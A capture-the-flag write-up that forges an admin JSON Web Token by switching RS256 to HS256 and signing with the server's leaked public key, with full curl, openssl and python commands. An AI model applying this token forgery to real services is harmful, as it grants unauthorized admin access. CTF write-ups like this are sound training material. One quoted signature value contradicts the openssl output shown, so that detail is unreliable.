# Unlock Me

## Challenge Description
Our agents discovered COViD's admin panel! They also stole the credentials minion:banana, but it seems that the user isn't allowed in. Can you find another way?

[Admin Panel](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/)

## Solution
Firstly, we are given an admin panel link, when you visit the website you are greeted by:
![admin-panel](https://user-images.githubusercontent.com/52084346/101287753-37748900-382d-11eb-99dd-dc3afd1c7383.PNG)


Inputting the username:password into the fields and pressing sign in gives us the following error:
![admin-panel-error](https://user-images.githubusercontent.com/52084346/101287754-38a5b600-382d-11eb-8ebe-b2b458f4325a.PNG)


Which meant that the credentials were correct, but the user was not an admin thus he couldn’t enter. I then proceeded to do a manual explore on OWASP ZAP and then tried to login with the same credentials which gave me this 2 requests:  
![zap](https://user-images.githubusercontent.com/52084346/101287755-393e4c80-382d-11eb-85b7-1bc85f7ccd7c.PNG)


The username and password we specified in the fields was sent in a POST request to /login in JSON and the response was a JSON:
``
{"accessToken":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3MjczNzgwfQ.by3_9WqVZ3ChEgP9TN5xGfKCmT98lrKpSt0-aUfLbc-iWm7PYGk05oy1hndLMJjDDqxuQ3IzB-VD01Mb3YEajRIB_G7ZxFlXeZoE_91dXZvXaVum7uDLW9U-G710ec9QDKoZObosEvsAOvGkQGpLcClgKh-7IAp3yMb8UWx6As05FKqmYvB7nS9out1kFCV5LJ4WVYU8x0POSkaQEcOPeu3ve6eCaF-jfMX32aJdP16v3NaGJmaCUCXxtN67sk7CszcpE9ladpZjELkxR40ltWg20fn1qwUj0fPXRLUoyZYOCa12tZgHcDyQTAETTPDABNoYn7hdi42PLyskb0b_twmE4mo4Bu_FZYJjfsqogO_G3Rd2TQoPeRnO9xTcjIIyfumz2_oT-4B0JVtUC4YOuQL2WIvvIHePsNLRsXpajct9TrQ48sj4f2oTKiGZlb62VCoG1JUKNd6S9WlyWwhBtpFszaFFvfCzieIDFA4lecGH7_hZXKlgTzDcQtgcKDP27vDm4z98K50jI57G2s_3UPnpcC07Ri_0h4HhSpJ_Z26gGH3TqyuBU5R4WpLhP3u0rfH1bEjVEDc2VLp3JlUJbV52yhw82dGPbFPhvd-6Fj5c5LlN_-kdNgrE_6SQWAQgRaWzFd1UndtMy3GRLf5n3MRB7O8m9Y94wPwk5bpgmQA"}
``

This accessToken was then added into an Authorization header in a GET request sent to /unlock:
![zap2](https://user-images.githubusercontent.com/52084346/101287757-393e4c80-382d-11eb-89e8-ead9b6d932e8.PNG)

^ Shown here in the actual request

and here if you inspect element on the website or do ```curl http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/```
![curl1](https://user-images.githubusercontent.com/52084346/101288143-e5813280-382f-11eb-8e00-0e97ce454ee5.PNG)

So, from the 3 “.” located in the accessToken I suspected that this was a JSON Web Token (JWT) and it was being used to authenticate the user.
JWT tokens contain 3 parts:
-	Header (which contains the algorithm type and token type)
-	Payload (data)
-	Verify Signature 

I used https://jwt.io/ and inputted the accessToken which gave me the decoded base64url information about the JWT:
![decoded](https://user-images.githubusercontent.com/52084346/101287758-39d6e300-382d-11eb-9a4e-ece92328f794.PNG)

So, this challenge required me to craft a JSON Web Token. However, the token used RS256 which was an asymmetrical algorithm and thus a private key was used to sign the token and I couldn’t find the private key anywhere on the website’s code.

Luckily, after searching around the internet I found out that there is a well-known vulnerability where you can trick the server into accepting a symmetrically signed token.

Firstly, I needed the public key which I found in the HTML code of the website in a comment:
![comment](https://user-images.githubusercontent.com/52084346/101287759-39d6e300-382d-11eb-8382-714cd6c6fed7.PNG)

Then I did...
```
$ curl http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem                                         
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4Cot1mM0eF5cZUnifKx0
8MJQ59ui9/8DLzWpWWtlPGsB4T9UsaAspndZJafbGFq0v+vGzG+TltJjb1v+tTj8
sqFanc/KWdQZr3WwmuhU95EJ7RRhtEIxTN8Rn1KOKUqZ/Plmf4LrMrMZm66DqaTW
H2my5IRShK0i0YpziT9JEeVJtS/zC+UUdbImrOavjD4PDZv14FLEuePMN0mCNcQ5
z5iSQv5j8npbtvMBbeAKMvYyCeIchjW22Dp/tNi4xfI7CaTyPp0pO3+MZ9vJ8O02
YOC7/+tQX2NdveVuKYEg4XTQ/nmiYSK9DeXyO/EGkQzxZjpLv5ZMN07Nau2xpQoG
1Ip4YfDA5Y/MjA8qDgNN0n/pmBaPBHNvFK6mWJllnuOnLpQHCxZNxBudxTLSoXkq
XQPRKcdZpbv0kjt/ZpwkoXHfQLToJyZQgQXtEHaW36Ko9Xjq3cDWzkSjADMxaq/5
8SZvPUknm3Mv9KN8zYiePYGUl2aLyKumKF++rlh7a6xJgcBcs10bf0yyeRU3NWWb
0pz4dgdrgh2sXrg/U51VhejnNfvfRf+4Cy1QM4QWbKXZk9sLtLpkfiou/ri3YUn3
txIgfYKa7a5tOtBWSRHHlHOmS58Ab51pmSGdjIeCa+WMie0i5reuRb6WJ27jnvJF
G0hytABBbCgeL00ymJK16tUCAwEAAQ==
-----END PUBLIC KEY-----

```
which gave me a key so I saved the key using  ```$ curl http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem --output public.pem```
Which gave me the public key I needed to sign my JWT with. 

Next, I had to edit the decoded base64url so that the account would be recognised as an admin instead of a user and also change the algo type to HS256 this was done using https://simplycalc.com/base64url-encode.php
```
{"alg":"HS256","typ":"JWT"}
```
became
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

and
```
{"username":"minion","role":"admin","iat":1607280171}
```
became this
```
eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzI4MDE3MX0
```
Now I have crafted the header and payload of the JWT and now have to sign it with the public.pem key I got earlier.

Firstly, I had to turn the public.pem key to a ASCII hex to make signing easier as we are able to control the bytes.
```
$ cat public.pem | xxd -p | tr -d "\\n"                                                        

2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454134436f74316d4d30654635635a556e69664b78300a384d4a5135397569392f38444c7a57705757746c504773423454395573614173706e645a4a61666247467130762b76477a472b546c744a6a6231762b74546a380a737146616e632f4b5764515a723357776d7568553935454a3752526874454978544e38526e314b4f4b55715a2f506c6d66344c724d724d5a6d363644716154570a48326d7935495253684b30693059707a6954394a4565564a74532f7a432b55556462496d724f61766a443450445a763134464c457565504d4e306d434e6351350a7a3569535176356a386e706274764d426265414b4d76597943654963686a57323244702f744e69347866493743615479507030704f332b4d5a39764a384f30320a594f43372f2b745158324e64766556754b594567345854512f6e6d6959534b39446558794f2f45476b517a785a6a704c76355a4d4e30374e6175327870516f470a314970345966444135592f4d6a41387144674e4e306e2f706d42615042484e76464b366d574a6c6c6e754f6e4c70514843785a4e7842756478544c536f586b710a585150524b63645a706276306b6a742f5a70776b6f584866514c546f4a795a51675158744548615733364b6f39586a71336344577a6b536a41444d7861712f350a38535a7650556b6e6d334d76394b4e387a596965505947556c32614c794b756d4b462b2b726c68376136784a676342637331306266307979655255334e5757620a30707a3464676472676832735872672f5535315668656a6e4e66766652662b34437931514d345157624b585a6b39734c744c706b66696f752f72693359556e330a7478496766594b61376135744f744257535248486c484f6d53353841623531706d5347646a496543612b574d6965306935726575526236574a32376a6e764a460a4730687974414242624367654c3030796d4a4b31367455434177454141513d3d0a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
```
Next combine the header and payload of the JWT (adding a dot between the 2) which gave me:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzI4MDE3MX0
```

Now I used the ASCII hex public.pem key to sign the JWT
```
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzI4MDE3MX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454134436f74316d4d30654635635a556e69664b78300a384d4a5135397569392f38444c7a57705757746c504773423454395573614173706e645a4a61666247467130762b76477a472b546c744a6a6231762b74546a380a737146616e632f4b5764515a723357776d7568553935454a3752526874454978544e38526e314b4f4b55715a2f506c6d66344c724d724d5a6d363644716154570a48326d7935495253684b30693059707a6954394a4565564a74532f7a432b55556462496d724f61766a443450445a763134464c457565504d4e306d434e6351350a7a3569535176356a386e706274764d426265414b4d76597943654963686a57323244702f744e69347866493743615479507030704f332b4d5a39764a384f30320a594f43372f2b745158324e64766556754b594567345854512f6e6d6959534b39446558794f2f45476b517a785a6a704c76355a4d4e30374e6175327870516f470a314970345966444135592f4d6a41387144674e4e306e2f706d42615042484e76464b366d574a6c6c6e754f6e4c70514843785a4e7842756478544c536f586b710a585150524b63645a706276306b6a742f5a70776b6f584866514c546f4a795a51675158744548615733364b6f39586a71336344577a6b536a41444d7861712f350a38535a7650556b6e6d334d76394b4e387a596965505947556c32614c794b756d4b462b2b726c68376136784a676342637331306266307979655255334e5757620a30707a3464676472676832735872672f5535315668656a6e4e66766652662b34437931514d345157624b585a6b39734c744c706b66696f752f72693359556e330a7478496766594b61376135744f744257535248486c484f6d53353841623531706d5347646a496543612b574d6965306935726575526236574a32376a6e764a460a4730687974414242624367654c3030796d4a4b31367455434177454141513d3d0a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
(stdin)= 60349a7e3d6593f5b230db3e333081be58ba1ff42beb91e68c333b6e8810cad4
```
The output is the HMAC signature: 
```
7b6ec71357b3ff0271118297f4ee6aacc90fff8cc677c1ef2aac20100e07a5df
```

So, now converted the ASCII hex signature into JWT format which can be done using this python code:
```
$ python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('60349a7e3d6593f5b230db3e333081be58ba1ff42beb91e68c333b6e8810cad4')).replace('=','')\")"

```
and we get...
```
YDSafj1lk_WyMNs-MzCBvli6H_Qr65HmjDM7bogQytQ
```

Now, I can finally craft the JWT by combining the header, payload and our output (seperated by .)
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzI4MDE3MX0.YDSafj1lk_WyMNs-MzCBvli6H_Qr65HmjDM7bogQytQ
```

Then I used OWASP ZAP again and found the /unblock request which I got earlier and went into the "Manual Request Editor" by right-clicking the request and pressing "Open/Resend with Request Editor".
I modified the Authorization Header by changing the JWT to the one I crafted above:

![zap3](https://user-images.githubusercontent.com/52084346/101289506-d7371480-3837-11eb-8db9-16b1cc15e58a.PNG)

and I pressed "Send" which gave me the flag:

![zap4](https://user-images.githubusercontent.com/52084346/101289717-3184a500-3839-11eb-8aa5-34400415ed6f.PNG)

```
{"flag":"govtech-csg{5!gN_0F_+h3_T!m3S}"}
```







